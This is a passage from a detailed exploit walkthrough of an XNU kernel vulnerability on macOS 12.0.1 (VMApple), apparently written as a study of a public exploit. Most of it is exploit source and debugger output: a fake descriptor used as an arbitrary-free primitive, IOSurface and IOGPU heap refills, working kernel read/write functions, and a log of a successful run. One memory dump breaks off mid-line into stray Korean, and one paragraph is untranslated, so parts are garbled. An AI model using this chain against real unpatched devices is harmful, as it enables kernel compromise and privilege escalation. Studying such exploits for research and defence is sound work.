Tracing through XNU code, the flow is as follows:
`ipc_kmsg_clean
-> ipc_kmsg_clean_body`

```c
// xnu-8019.41.5/osfmk/ipc/ipc_kmsg.c:1842
static void
ipc_kmsg_clean(
	ipc_kmsg_t      kmsg)
{
	ipc_object_t object;
	mach_msg_bits_t mbits;

	/* deal with importance chain while we still have dest and voucher references */
	ipc_importance_clean(kmsg);

	mbits = kmsg->ikm_header->msgh_bits;
	object = ip_to_object(kmsg->ikm_header->msgh_remote_port);
	
	...

	if (mbits & MACH_MSGH_BITS_COMPLEX) { // <- THIS !!!!!
		mach_msg_body_t *body;

		body = (mach_msg_body_t *) (kmsg->ikm_header + 1);
		ipc_kmsg_clean_body(kmsg, body->msgh_descriptor_count,
		    (mach_msg_descriptor_t *)(body + 1));
	}
}
```

```c
// xnu-8019.41.5/osfmk/ipc/ipc_kmsg.c:1687
static void
ipc_kmsg_clean_body(
	__unused ipc_kmsg_t     kmsg,
	mach_msg_type_number_t  number,
	mach_msg_descriptor_t   *saddr)
{
	mach_msg_type_number_t      i;

	if (number == 0) {
		return;
	}

	for (i = 0; i < number; i++, saddr++) {
		switch (saddr->type.type) {
		...
		case MACH_MSG_OOL_PORTS_DESCRIPTOR: /* 2 */{
			ipc_object_t                    *objects;
			mach_msg_type_number_t          j;
			mach_msg_ool_ports_descriptor_t *dsc;

			dsc = (mach_msg_ool_ports_descriptor_t  *)&saddr->ool_ports;
			objects = (ipc_object_t *) dsc->address;

			if (dsc->count == 0) {
				break;
			}

			assert(objects != (ipc_object_t *) 0);

			/* destroy port rights carried in the message */

			for (j = 0; j < dsc->count; j++) {
				ipc_object_t object = objects[j];

				if (!IO_VALID(object)) {
					continue;
				}

				ipc_object_destroy(object, dsc->disposition);
			}

			/* destroy memory carried in the message */

			assert(dsc->count != 0);

			kfree_type(mach_port_t, dsc->count, dsc->address);
			break;
		}
		...
		default:
			panic("invalid descriptor type: (%p: %d)",
			    saddr, saddr->type.type);
		}
	}
}
```

So, arbitrary free becomes possible.

The memory region that was allocated at address **0xfffffe2281888000** gets freed.

This behavior appears in exploit code inside `exploitation_init` function, under the comment **“fake descriptor for free primitive.”**
There, the values for **address**, **deallocate**, **copy**, **disposition**, **type**, and **count**—which define the target address to be freed—are all embedded as-is.
Because of this, it becomes possible to free hard‑coded allocation address.

```c
int exploitation_init(void)
{
...
    // fake descriptor for free primitive
    *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;    // (mach_msg_body_t *)body->msgh_descriptor_count
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
...
}
```

```c
(lldb) bt
* thread #4, name = 'CPU3', stop reason = breakpoint 5.1
  * frame #0: 0xfffffe0026113ff0 kernel.release.vmapple`ipc_kmsg_clean_body(kmsg=<unavailable>, number=1, saddr=<unavailable>) at ipc_kmsg.c:1691 [opt]
    frame #1: 0xfffffe0026113f68 kernel.release.vmapple`ipc_kmsg_clean(kmsg=0xfffffe1514994700) at ipc_kmsg.c:1873:3 [opt]
    frame #2: 0xfffffe0026113e38 kernel.release.vmapple`ipc_kmsg_reap_delayed at ipc_kmsg.c:1671:3 [opt]
    frame #3: 0xfffffe002611e210 kernel.release.vmapple`ipc_port_destroy(port=0xfffffe1514999180) at ipc_port.c:1148:3 [opt]
    frame #4: 0xfffffe0026122d54 kernel.release.vmapple`ipc_right_destroy(space=<unavailable>, name=4485379, entry=<unavailable>, check_guard=<unavailable>, guard=<unavailable>) at ipc_right.c:1047:4 [opt]
    frame #5: 0xfffffe002612cec8 kernel.release.vmapple`mach_port_destroy(space=0xfffffe150dd42880, name=4485379) at mach_port.c:768:7 [opt]
    frame #6: 0xfffffe00261ac990 kernel.release.vmapple`_Xmach_port_destroy(InHeadP=0xfffffe1514e7898c, OutHeadP=0xfffffe1514e7878c) at mach_port_server.c:812:18 [opt]
    frame #7: 0xfffffe002613d220 kernel.release.vmapple`ipc_kobject_server_internal(port=<unavailable>, request=0xfffffe1514e78900, replyp=0xfffffe6029cd3c30) at ipc_kobject.c:472:3 [opt]
    frame #8: 0xfffffe002613cd74 kernel.release.vmapple`ipc_kobject_server(port=<unavailable>, request=0xfffffe1514e78900, option=<unavailable>) at ipc_kobject.c:580:8 [opt]
    frame #9: 0xfffffe00261148e8 kernel.release.vmapple`ipc_kmsg_send(kmsg=0xfffffe1514e78900, option=3, send_timeout=0) at ipc_kmsg.c:2202:10 [opt]
    frame #10: 0xfffffe002612c2c8 kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:371:8 [opt]
    frame #11: 0xfffffe0026259b2c kernel.release.vmapple`mach_syscall(state=0xfffffe151165c9f0) at bsd_arm64.c:276:11 [opt]
    frame #12: 0xfffffe0026262e78 kernel.release.vmapple`handle_svc(state=0xfffffe151165c9f0) at sleh.c:2411:3 [opt] [inlined]
    frame #13: 0xfffffe0026262e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe151165c9f0, esr=<unavailable>, far=4840380424) at sleh.c:743:3 [opt]
    frame #14: 0xfffffe00260f479c kernel.release.vmapple`fleh_synchronous + 40
    frame #15: 0x00000001a9f7d954
    frame #16: 0x00000001a9f9a250
    frame #17: 0x0000000100fb2690
    frame #18: 0x0000000100fb0ebc
    frame #19: 0x0000000100fb1288
    frame #20: 0x0000000100fb13bc
    frame #21: 0x000000010110d0f4

(lldb) reg read
General Purpose Registers:
        x0 = 0x0000000000000001
        x1 = 0xfffffe228d000024
...

(lldb) p/x *(mach_msg_ool_ports_descriptor_t  *)0xfffffe228d000024
(mach_msg_ool_ports_descriptor_t)  (address = 0xfffffe2281888000, deallocate = 0x00000000, copy = 0x00000000, disposition = 0x00000011, type = 0x00000002, count = 0x000007f8)
```

And if we look at memory region that had been allocated at **0xfffffe2281888000 (= KHEAP_DEFAULT_MAPPABLE_LOC)**, we can see the following address.

Do you remember **`notif_port`** we looked at earlier in *“1-5. Going back, let's look at spray code again”*?

That same `notif_port` will also be affected by 
`ipc_object_destroy(object, dsc->disposition);` in `ipc_kmsg_clean_body`.
(*More precisely, `notif_port` registered in `kheap_default_ports[i]` where 1‑byte copy occurred.*)

```c
(lldb) p/x *(ipc_object_t *)0xfffffe2281888000
(ipc_object_t) 0xfffffe15149bf200
```

## 3-4. IOSurfaceRoot_lookup_surface / IOSurfaceRoot_release_all

As mentioned earlier, by calling `IOSurfaceRootUserClient::lookup_surface`,
we can force kernel allocation for `IOSurfaceClients` array to be **0x4000** in size, and we make it get assigned to address **0xfffffe2281888000**, which was just arbitrarily freed.

Later on, in the code under comment *“find allocation at KHEAP_DEFAULT_MAPPABLE_LOC”*, `IOSurfaceRoot_release_all` is called before `port_destroy` to prevent **zone_require panic**.

```
kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t sz = IOSURFACE_CREATE_OUTSIZE;
    uint8_t o[IOSURFACE_CREATE_OUTSIZE];
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 4, &scalarInput, 1, 0, 0, 0, 0, o, (size_t *)&sz);
    return ret;
}

kern_return_t IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 1, &scalarInput, 1, 0, 0, 0, 0, 0, 0);
    return ret;
}

void IOSurfaceRoot_release_all(io_connect_t uc)
{
    for (uint32_t surf_id = 1; surf_id < 0x3FFF; ++surf_id)
    {
        IOSurfaceRoot_release_surface(uc, surf_id);
    }
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
    // do refill in kheap default
    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);
    // NULL out array
    IOSurfaceRoot_release_all(iosurface_connect_krw);
...
}
```

Let’s take a closer look.

If we actually enable the **ENABLE_HELPER** macro and inspect address assigned to
`m_IOSurfaceClientArrayPointer`, we can see that it's same
**KHEAP_DEFAULT_MAPPABLE_LOC** address that was arbitrarily freed earlier.

- Code

```c
    // do refill in kheap default
    IOSurfaceRoot_lookup_surface(iosurface_connect_krw, last_id);

#if ENABLE_HELPER
    uint64_t surfRoot = port_to_kobject(iosurface_connect_krw);
    INFO("iosurface_connect_krw's IOSurfaceRootUserClient = 0x%llx\n", surfRoot);

	uint64_t surfClients = kextrw_kread64(surfRoot + 0x118);
	INFO("iosurface_connect_krw's IOSurfaceRootUserClient->m_IOSurfaceClientArrayPointer: 0x%llx\n", surfClients);
    getchar();
#endif
```

- Running result

```c
[*] iosurface_connect_krw's IOSurfaceRootUserClient = 0xfffffe150df24cf0
[*] iosurface_connect_krw's IOSurfaceRootUserClient->m_IOSurfaceClientArrayPointer: 0xfffffe2281888000
```

KHEAP_DEFAULT_MAPPABLE_LOC 주소로 할당받는것이 가능했던 이유에 대해 설명해보겠다. 

`IOSurfaceRootUserClient::lookup_surface`는 최종적으로 `IOSurfaceRootUserClient::alloc_handles`에서 `m_IOSurfaceClientArrayPointer` 필드에 `IOMallocZero`으로부터 반환된 커널할당주소가 지정된다.

IOSurfaceRootUserClient::lookup_surface
→ IOSurfaceClient::withBuffer
→ IOSurfaceClient::init
→ IOSurfaceRootUserClient::set_surface_handle
→ IOSurfaceRootUserClient::alloc_handles 

Previously, by calling `IOSurfaceRoot_create_surface_fast` function multiple times, we increased `i_IOSurfaceHandleTotalCapability` to 0x800,
so kernel allocation size becomes 0x4000 (= 8 * 0x800).

Although `IOMallocZero` is of type KHEAP_KEXT, in iOS 15, the KHEAP_DEFAULT and KHEAP_KEXT zones are not isolated and share the same 0x4000 allocation size.
So, it is possible to have this allocated at **KHEAP_DEFAULT_MAPPABLE_LOC** address.
**(However, in VMApple, KHEAP_DEFAULT and KHEAP_KEXT are isolated, so not possible.)**

![Drawing 2025-11-23 03.03.43.excalidraw 1.png](pics/Drawing_2025-11-23_03.03.43.excalidraw_1.png)

After that, we can see call to `IOSurfaceRoot_release_all`,
which seems to NULL out an array that was maybe allocated through multiple calls to `IOSurfaceRoot_create_surface_fast`.

(Although the comment says “NULL out array”, the exact reason why `IOSurfaceRoot_release_all` function is called is unclear.)

(One thing we do know is that if this code is disabled, zone_require panic occurs when performing `port_destroy` in the loop that searches for allocations at KHEAP_DEFAULT_MAPPABLE_LOC.)

```c
int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
    // NULL out array
    IOSurfaceRoot_release_all(iosurface_connect_krw);

    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && port_has_msg(notif_port);
         i++)
    {
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_default_ports[i]);   //will trigger zone_require_panic if you don't IOSurfaceRoot_release_surface(iosurface_connect_krw, last_id); or IOSurfaceRoot_release_all(iosurface_connect_krw);

        kheap_default_idx = i;
    }
...
}
```

```c
(lldb) bt
* thread #1, name = 'CPU0', stop reason = breakpoint 1.1
  * frame #0: 0xfffffe000c87eea4 kernel.release.vmapple`panic(str="zone_require failed: address in unexpected zone id %d (%s%s) (addr: %p, expected: %s%s) @%s:%d") at debug.c:872:2 [opt]
    frame #1: 0xfffffe000c883378 kernel.release.vmapple`zone_require_panic(zone=0xfffffe000e67da38, addr=0xfffffe1515347e80) at zalloc.c:1366:3 [opt]
    frame #2: 0xfffffe000c883398 kernel.release.vmapple`zone_id_require_panic(zid=<unavailable>, addr=<unavailable>) at zalloc.c:1377:2 [opt]
    frame #3: 0xfffffe000c0fdd38 kernel.release.vmapple`zone_id_require(zid=<unavailable>, esize=<unavailable>, addr=<unavailable>) at zalloc.c:1419:2 [opt]
    frame #4: 0xfffffe000c07ba68 kernel.release.vmapple`ipc_object_validate(object=0xfffffe1515347e80) at ipc_object.c:0 [opt] [inlined]
    frame #5: 0xfffffe000c07ba3c kernel.release.vmapple`ipc_object_lock(io=0xfffffe1515347e80) at ipc_object.c:1339:2 [opt]
    frame #6: 0xfffffe000c07c2ac kernel.release.vmapple`ipc_port_release_send(port=0xfffffe1515347e80) at ipc_port.c:2863:3 [opt] [inlined]
    frame #7: 0xfffffe000c07c2a4 kernel.release.vmapple`ipc_object_destroy(object=0xfffffe1515347e80, msgt_name=<unavailable>) at ipc_object.c:832:3 [opt]
    frame #8: 0xfffffe000c0740c0 kernel.release.vmapple`ipc_kmsg_clean_body(kmsg=<unavailable>, number=1, saddr=0xfffffe1514aca584) at ipc_kmsg.c:1753:5 [opt]
    frame #9: 0xfffffe000c073f68 kernel.release.vmapple`ipc_kmsg_clean(kmsg=0xfffffe1514aca500) at ipc_kmsg.c:1873:3 [opt]
    frame #10: 0xfffffe000c073e38 kernel.release.vmapple`ipc_kmsg_reap_delayed at ipc_kmsg.c:1671:3 [opt]
    frame #11: 0xfffffe000c07e210 kernel.release.vmapple`ipc_port_destroy(port=0xfffffe1514acf520) at ipc_port.c:1148:3 [opt]
    frame #12: 0xfffffe000c082d54 kernel.release.vmapple`ipc_right_destroy(space=<unavailable>, name=3780099, entry=<unavailable>, check_guard=<unavailable>, guard=<unavailable>) at ipc_right.c:1047:4 [opt]
    frame #13: 0xfffffe000c08cec8 kernel.release.vmapple`mach_port_destroy(space=0xfffffe150db43a00, name=3780099) at mach_port.c:768:7 [opt]
    frame #14: 0xfffffe000c10c990 kernel.release.vmapple`_Xmach_port_destroy(InHeadP=0xfffffe1514ac898c, OutHeadP=0xfffffe1514ac918c) at mach_port_server.c:812:18 [opt]
    frame #15: 0xfffffe000c09d220 kernel.release.vmapple`ipc_kobject_server_internal(port=<unavailable>, request=0xfffffe1514ac8900, replyp=0xfffffe601e62bc30) at ipc_kobject.c:472:3 [opt]
    frame #16: 0xfffffe000c09cd74 kernel.release.vmapple`ipc_kobject_server(port=<unavailable>, request=0xfffffe1514ac8900, option=<unavailable>) at ipc_kobject.c:580:8 [opt]
    frame #17: 0xfffffe000c0748e8 kernel.release.vmapple`ipc_kmsg_send(kmsg=0xfffffe1514ac8900, option=3, send_timeout=0) at ipc_kmsg.c:2202:10 [opt]
    frame #18: 0xfffffe000c08c2c8 kernel.release.vmapple`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:371:8 [opt]
    frame #19: 0xfffffe000c1b9b2c kernel.release.vmapple`mach_syscall(state=0xfffffe150ff02120) at bsd_arm64.c:276:11 [opt]
    frame #20: 0xfffffe000c1c2e78 kernel.release.vmapple`handle_svc(state=0xfffffe150ff02120) at sleh.c:2411:3 [opt] [inlined]
    frame #21: 0xfffffe000c1c2e0c kernel.release.vmapple`sleh_synchronous(context=0xfffffe150ff02120, esr=<unavailable>, far=4368957440) at sleh.c:743:3 [opt]
    frame #22: 0xfffffe000c05479c kernel.release.vmapple`fleh_synchronous + 40
    frame #23: 0x0000000184ff9954
    frame #24: 0x0000000185016250	//_mach_port_destroy ...
    frame #25: 0x0000000100eee710	//_port_destroy+0x24
    frame #26: 0x0000000100eecff4	//_exploitation_get_krw_with_arb_free+0x1c0
    frame #27: 0x0000000100eed2e4	//_exploit_get_krw_and_kernel_base+0x40
    frame #28: 0x0000000100eed418	//_main+0x50
    frame #29: 0x00000001012650f4
```

Earlier, we mentioned that the `ipc_object_destroy(object, dsc->disposition);` code inside `ipc_kmsg_clean_body` would affect `notif_port`.
The loop here is responsible for checking **which port in the `kheap_default_ports` array had its `notif_port` destroyed**.

Through this process, we can determine **which port corresponds to allocation at the KHEAP_DEFAULT_MAPPABLE_LOC address**, and when that port is destroyed via `port_destroy`, the memory previously allocated at **KHEAP_DEFAULT_MAPPABLE_LOC** gets freed.

```c
int port_has_msg(mach_port_t p)
{
    mach_msg_header_t msg = { 0 };

    mach_msg(&msg, MACH_RCV_LARGE | MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x10, p, 0, 0);

    return msg.msgh_size;
}

void port_receive_msg(mach_port_t p, uint8_t *buf, unsigned int n)
{
    mach_msg((mach_msg_header_t *)buf,
              MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
              0,
              n,
              p,
              0,
              0);
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
    // find allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    int kheap_default_idx = -1;
    for (uint32_t i = 0;
         (i < PORTS_COUNT) && port_has_msg(notif_port);
         i++)
    {
        port_receive_msg(notif_port, msg_buf, sizeof(msg_buf));
       
        port_destroy(kheap_default_ports[i]);   //will trigger zone_require_panic if you don't IOSurfaceRoot_release_all(iosurface_connect_krw);

        kheap_default_idx = i;
    }
    
    // Note: don't add time sensitive code here, allocation at KHEAP_DEFAULT_MAPPABLE_LOC
    // has been free'd and will be refilled below
    
    // printf("Allocation at KHEAP_DEFAULT_MAPPABLE_LOC has been free'd\n");
    
    if (kheap_default_idx >= PORTS_COUNT)
    {
        printf("kheap_default_idx >= PORTS_COUNT\n");
        exit(1);
    }
...
}
```

## 3-5. Achieving kernel R/W using IOGPU / IOSurface

The **IOGPU userclient**, similar to how IOSurface userclient manages objects within IOSurfaceClients array, also manages objects in its own array. The IOGPU array is **variable in size and allocated in KHEAP_KEXT**. In particular, IOGPU provides selector to create `IOGPUCommandQueue` objects and add them to this array. Let’s see how this can be leveraged to achieve kernel R/W.

First, to have the IOGPU array allocated at **KHEAP_DEFAULT_MAPPABLE_LOC** address, we free additional `kheap_default_ports`.

The required number of extra frees varies depending on device environment; in case of VMApple, it was 1.

```c
int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
    // extra frees
    for (int i = 0; i < extra_frees_for_device; ++i)
    {
        port_destroy(kheap_default_ports[(kheap_default_idx+1)+i]);
    }
...
}
```

Before calling selector `IOGPUDeviceUserClient::s_new_command_queue`, which adds an `IOGPUCommandQueue` object to array, let’s first take a look at `IOGPU_init`.

```c
int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
// do refill
    iogpu_connect = IOGPU_init();
    // add entry
    IOGPU_create_command_queue(iogpu_connect, KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10);
    
    printf("kheap_default_idx: %08X\n", kheap_default_idx);
...
}
```

When `IOGPU_init` acquires userclient, it internally calls `IOGPU::newUserClient`.

The call chain is as follows:
IOGPU::newUserClient
→ IOGPUDeviceUserClient::start
→ IOGPUDeviceUserClient::deviceUserClientStart
→ IOGPU::createDevice
→ IOGPUDevice::init

Within `IOGPUDevice::init`, `IOGPUNamespace::strongNamespace` is called multiple times, and here we can see allocations of kernel page-sized memory via `IOMalloc`

We can observe that the address of `kheap_default_ports` that was freed 1 more time earlier, as well as the address freed previously when port was `port_destroy`-ed and allocated at `KHEAP_DEFAULT_MAPPABLE_LOC`, is being reallocated.

![Drawing 2025-11-24 05.15.03.excalidraw 1.png](pics/Drawing_2025-11-24_05.15.03.excalidraw_1.png)

When `IOGPUDeviceUserClient::s_new_command_queue` selector is called,
the string provided in input structure is copied starting at offset `+0x10` of newly created `IOGPUCommandQueue` object.

Although the string is null-terminated, its content can be arbitrarily controlled, allowing pointer to be precisely set at offset `+0x40` (null byte is not strictly required).

`AppleParavirtGPU::newCommandQueue (__ZN16AppleParavirtGPU15newCommandQueueEv)` function allocates and creates `IOGPUCommandQueue` object, and the copy starting from offset `+0x10` occurs at following location.

IOGPUDeviceUserClient::s_new_command_queue
→ AppleParavirtCommandQueue::init
→ j____strlcpy_chk_26

![Drawing 2025-11-24 05.15.03.excalidraw.png](pics/Drawing_2025-11-24_05.15.03.excalidraw.png)

```c
(lldb) c
Process 1 resuming
Process 1 stopped
* thread #1, name = 'CPU0', stop reason = breakpoint 1.1
    frame #0: 0xfffffe001951e5a4
->  0xfffffe001951e5a4: bl     0xfffffe0019528d14
    0xfffffe001951e5a8: ldrb   w8, [x22, #0x404]
    0xfffffe001951e5ac: cmp    w8, #0x0
    0xfffffe001951e5b0: cset   w8, ne
Target 0: (kernel.release.vmapple) stopped.
(lldb) reg read x0
      x0 = 0xfffffe151116c790
(lldb) reg read x1
      x1 = 0xfffffe22878d47b4
(lldb) x/12gx 0xfffffe22878d47b4
0xfffffe22878d47b4: 0x0101010101010101 0x0101010101010101
0xfffffe22878d47c4: 0x0101010101010101 0x0101010101010101
0xfffffe22878d47d4: 0x0101010101010101 0x0101010101010101
0xfffffe22878d47e4: 0xfffffe228cffc010 0x0000000000000000
0xfffffe22878d47f4: 0x0000000000000000 0x0000000000000000
0xfffffe22878d4804: 0x0000000000000000 0x0000000000000000
```

Then, in `IOGPUWeakNamespace::addObjectLocked`,
we can see that value of register `x20` (which is the buffer address containing both 0x101010... string provided in input structure when calling selector and the address `KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10`) is written to `KHEAP_DEFAULT_MAPPABLE_LOC + 0x8`.

IOGPUDeviceUserClient::s_new_command_queue
→ IOGPUNamespace::addObject
→ IOGPUWeakNamespace::addObjectLocked

![Screenshot 2025-11-24 at 4.51.19 AM.png](pics/Screenshot_2025-11-24_at_4.51.19_AM.png)

```c
(lldb) b 0xfffffe0011b3bf04
Breakpoint 2: address = 0xfffffe0011b3bf04
(lldb) c
Process 1 resuming
Process 1 stopped
* thread #2, name = 'CPU1', stop reason = breakpoint 2.1
    frame #0: 0xfffffe0011b3bf04
->  0xfffffe0011b3bf04: str    x20, [x10, w0, uxtw #3]
    0xfffffe0011b3bf08: cbz    x20, 0xfffffe0011b3bf18
    0xfffffe0011b3bf0c: ldr    w10, [x19, #0x30]
    0xfffffe0011b3bf10: add    w10, w10, #0x1
    
(lldb) reg read x20 x10 w0
     x20 = 0xfffffe151137b400
     x10 = 0xfffffe2281888000
      w0 = 0x00000001
      
(lldb) x/12gx 0xfffffe151137b400
0xfffffe151137b400: 0x3de07e0012572710 0x0000000100000001
0xfffffe151137b410: 0x0101010101010101 0x0101010101010101
0xfffffe151137b420: 0x0101010101010101 0x0101010101010101
0xfffffe151137b430: 0x0101010101010101 0x0101010101010101
0xfffffe151137b440: 0xfffffe228cffc010 0x0000000000000000
0xfffffe151137b450: 0x0000000000000000 0x0000000000000000
```

In this way, we freed the allocated `m_IOSurfaceClientArrayPointer` using `port_destroy`, and by creating `IOGPUCommandQueue` object and adding it to array, we were able to arbitrarily manipulate the `m_IOSurfaceClientArrayPointer` data.

```c
(lldb) x/32gx 0xfffffe2281888000 //KHEAP_DEFAULT_MAPPABLE_LOC, IOSurfaceRootUserClient->m_IOSurfaceClientArrayPointer
0xfffffe2281888000: 0x0000000000000000 **0xfffffe1510b56800**
0xfffffe2281888010: 0x0000000000000000 0x0000000000000000
...
(lldb) x/32gx 0xfffffe1510b56800 (...+0x40 → KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10 = **0xfffff따라서** 
```

What we need to know is that address stored at **`m_IOSurfaceClientArrayPointer+8` is 0xfffffe228cffc010, which is located below `KHEAP_DATA_MAPPABLE_LOC` (=0xfffffe228d000000).**

**So,** we perform `port_destroy` on `kheap_data_port` at index `kheap_data_idx-1`. This frees the 0x4000-sized allocation at **0xfffffe228cffc000**.

Afterward, to reallocate this just-freed region, we perform pipe write of size `KERNEL_RW_SIZE_FAKE_ARRAY-1`.

```c
#define KERNEL_RW_SIZE_FAKE_ARRAY 0x4000

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...    
    // refill in kheap data
    port_destroy(kheap_data_ports[kheap_data_idx-1]);
    write(write_pipe, IOSurfaceClient_array_buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);

    kernel_rw_init(iosurface_connect_krw, 1, read_pipe, write_pipe);
...
}

int kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe)
{
    _uc = uc;
    _surf_id = surf_id;
    _read_pipe = read_pipe;
    _write_pipe = write_pipe;
    
    return 0;
}
```

We’re almost done.
Now, by calling the selector provided by IOSurface, we can perform kernel read/write!

The reason for `buf + 0x10` is that the address stored at `m_IOSurfaceClientArrayPointer+8` is **0xfffffe228cffc010**, which points to **+0x10 within 0xfffffe228cffc000 allocated page**.

```c
void kwrite32(uint64_t kaddr, uint32_t val)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0xA0; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(_uc, _surf_id, val);
}

uint32_t kread32(uint64_t kaddr)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf+ 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf+ 0x10 + 0xC0 ) = kaddr - 0x14; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    return IOSurfaceRoot_get_surface_use_count(_uc, _surf_id);
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
... 
    kwrite32(KHEAP_DEFAULT_MAPPABLE_LOC, 0xFEED);
    uint32_t result = kread32(KHEAP_DEFAULT_MAPPABLE_LOC);
    printf("Test kwrite32 and kread32: %08X (should be 0000FEED)\n", result);
...
}
```

Because we can control the **+0x40 offset (IOSurface pointer) of IOSurfaceClient element within the array**,
there's sufficient level of indirection to perform arbitrary kernel write and read.

![Drawing 2025-11-24 06.55.38.excalidraw.png](pics/Drawing_2025-11-24_06.55.38.excalidraw.png)

## 4. exploitation_cleanup

This code was written to prevent kernel panic after exploit process finishes.
The +0x8 offset corresponds to reference count of IOGPUCommandQueue and IOGPUNamespace, respectively.

```c
void exploitation_cleanup(void)
{
    uint64_t command_queue_loc = kread64(KHEAP_DEFAULT_MAPPABLE_LOC + 8);
    uint64_t parent_loc = kread64(command_queue_loc + 0x488);
    uint64_t namespace_loc = kread64(parent_loc + 0x88);
    
    // // bump refs
    kwrite32(command_queue_loc + 0x8, 10);
    kwrite32(namespace_loc + 0x8, 10);
    
    IOServiceClose(iogpu_connect);
}
```

If this code is not executed, panic occurs as shown below:
IOGPUDeviceUserClient::free
→ IOGPUDevice::free
→ IOGPUNamespace::free

So, by increasing reference count to 10, free operation will not be performed, which prevents panic from happening.

![Drawing 2025-11-24 06.55.38.excalidraw 1.png](pics/Drawing_2025-11-24_06.55.38.excalidraw_1.png)

From the offset information, one thing we can observe is that IOGPUDevice object accesses field at offset **+0x88** in order to retrieve IOGPUNamespace object.

![Screenshot 2025-11-25 at 10.37.40 AM.png](pics/Screenshot_2025-11-25_at_10.37.40_AM.png)

The second is that IOGPUCommandQueue object accesses field at offset **+0x488** in order to retrieve the IOGPUDevice object.

So, `parent_loc` variable used in exploit code is likely the address of **IOGPUDevice** object.

![Screenshot 2025-11-25 at 10.40.59 AM.png](pics/Screenshot_2025-11-25_at_10.40.59_AM.png)

# Running result

```c
seo@seos-Mac ~ % ./exp
Increase reliability...
Increase reliability...
Increase reliability...
Start (will fail if device has not been rebooted since last run)
iteration 0
kheap_data_idx: 0000175B
IOGPU_create_command_queue kr = 0x0 ((os/kern) successful)
kheap_default_idx: 000011C4
Test kwrite32 and kread32: 0000FEED (should be 0000FEED)
Get kernel base...
Got kernel base: 0xfffffe001cd98000
kread32(_kernel_base) success: FEEDFACF
Done

seo@seos-Mac ~ % sysctl kern.version
kern.version: Darwin Kernel Version 21.1.0: Wed Oct 13 17:33:22 PDT 2021; root:xnu-8019.41.5~1/RELEASE_ARM64_VMAPPLE

seo@seos-Mac ~ % sw_vers
ProductName:    macOS
ProductVersion: 12.0.1
BuildVersion:   21A559
```

# The Kind Person Who Helped Me

- [@jaakerblom](https://x.com/jaakerblom)
- [@0xMard](https://x.com/0xmard)

# References

[https://github.com/potmdehex/slides/blob/main/Zer0Con_2022_Tales_from_the_iOS_macOS_Kernel_Trenches.pdf](https://github.com/potmdehex/slides/blob/main/Zer0Con_2022_Tales_from_the_iOS_macOS_Kernel_Trenches.pdf)

[https://project-zero.issues.chromium.org/issues/42451345](https://project-zero.issues.chromium.org/issues/42451345)